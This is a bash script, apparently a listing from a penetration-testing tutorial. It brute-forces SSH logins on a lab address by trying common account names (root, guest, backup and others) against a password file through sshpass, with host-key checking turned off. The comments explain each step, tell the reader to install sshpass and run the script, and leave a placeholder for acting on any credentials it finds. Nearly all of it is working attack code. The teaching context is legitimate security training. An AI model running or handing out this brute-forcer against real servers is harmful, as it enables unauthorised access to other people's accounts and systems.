#!/bin/bash


# Define the target SSH server and port.
TARGET="172.16.10.13"
PORT="22"


# Define the username and password lists.
USERNAMES=("root" "guest" "backup" "ubuntu" "centos")  # (1)
PASSWORD_FILE="password.txt"  #(2)


echo "Starting SSH credential testing..."


# Loop through each combination of usernames and passwords.
for user in "${USERNAMES[@]}"; do   # (3)
    while IFS= read -r pass; do  # (4)
        echo "Testing credentials: ${user} / ${pass}"

        # Check the exit code to determine if the login was successful.
        if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \
                   -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then  # (5)
            echo "Successful login with credentials:"  # (6)
            echo "Host: ${TARGET}"
            echo "Username: ${user}"
            echo "Password: ${pass}"
            # Perform additional actions here using the credentials
            exit 0
        fi
    done
done


echo "No valid credentials found."


# This SSH brute-force bash script starts much like our other scripts:
# by defining the target IP address and port. Next, we specify a list of
# usernames (1) and a file that contains password that we'll use (2).
# At (3), we then iterate through each unername and use sshpass to inject
# passwords (5), which we read in line by line (4). We print any
# successful output (6).


# For this script to work, we need to install `sshpass`, a special
# utility that allows managing SSH connections in scripts. Install sshpass
# using the following command:
# $ sudo apt install sshpass -y
# Download and run the script to see the output:
# $ ./ssh-bruteforce.sh
